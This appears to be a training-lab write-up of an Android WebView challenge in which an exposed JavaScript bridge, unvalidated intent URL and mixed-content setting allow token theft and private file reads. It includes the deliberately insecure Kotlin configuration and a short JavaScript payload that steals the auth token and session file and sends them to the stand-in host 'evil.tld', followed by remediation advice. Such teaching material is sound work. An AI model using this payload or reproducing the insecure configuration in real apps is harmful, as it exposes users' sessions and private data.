Partner Promo WebView — Insecure JavaScript-to-Native Bridge and Arbitrary File Read

 28 Jun 2026 · 4 min read

This write-up covers the Partner Promo WebView challenge from Code Review Lab. It exposes a critical Android WebView vulnerability where addJavascriptInterface combined with weak network security pierces the app sandbox, enabling token theft and arbitrary file reads.

Executive Summary

The challenge focuses on an insecurely configured Android WebView component. By improperly utilizing the addJavascriptInterface mechanism alongside weak network security settings, the application accidentally pierces its own operational sandbox.

Vulnerability Class: Insecure JavaScript-to-Native Interface Exposure / Arbitrary File Read / Potential RCE

Vulnerability Breakdown

The core issue resides within PromoWebViewActivity. Three violations compound into a complete sandbox escape:

val landingUrl = intent.getStringExtra("landing_url").orEmpty()
webView.settings.javaScriptEnabled = true
webView.settings.domStorageEnabled = true
// Critical Flaw 1: Disabling mixed content protection
webView.settings.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
// Critical Flaw 2: Injecting a high-privilege native bridge into the web sandbox
webView.addJavascriptInterface(AndroidBridge(this, session), "Android")
webView.loadUrl(landingUrl)

1. Arbitrary Intent Parameter Processing

The app fetches the target URL dynamically via intent.getStringExtra("landing_url") without validating the destination domain. Any external component can control where the WebView navigates.

2. Piercing the Web Sandbox via addJavascriptInterface

By binding a high-privilege native object (AndroidBridge) and naming it "Android", the application exposes powerful native functions globally to the WebView's execution context. Any script — regardless of origin — can invoke window.Android.*.

3. Unrestricted Mixed Content Mode

MIXED_CONTENT_ALWAYS_ALLOW allows the WebView to execute active scripts over plain HTTP, even if the initial page was loaded via HTTPS.

Exploitation Vectors

  • MitM Injection: On an untrusted network, cleartext HTTP traffic can be intercepted and malicious JavaScript injected into the response stream.
  • Open Redirect: If a trusted partner domain hosts an open redirect, an attacker passes a seemingly valid URL that diverts to an attacker-controlled site.

Once attacker-controlled JavaScript executes in the WebView, the sandbox collapses:

// 1. Exfiltrating session tokens directly from application memory
const token = window.Android.getAuthToken();
// 2. Arbitrary file read against the private sandbox
const secrets = window.Android.readFile('/data/data/com.dealdash/shared_prefs/session.xml');
// 3. Exfiltrating stolen assets to external infrastructure
fetch('https://evil.tld/c?t=' + encodeURIComponent(token) + '&s=' + encodeURIComponent(secrets));

Remediation

  1. Strict Domain Whitelisting: Validate incoming intent URLs against an absolute whitelist. Reject plaintext protocols entirely.
  2. Enforce Secure Content Controls: Use MIXED_CONTENT_NEVER_ALLOW to prevent script degradation over cleartext.
  3. Limit Interface Exposure: Decorate exposed methods with @JavascriptInterface and strip aggressive capabilities like custom filesystem readers.
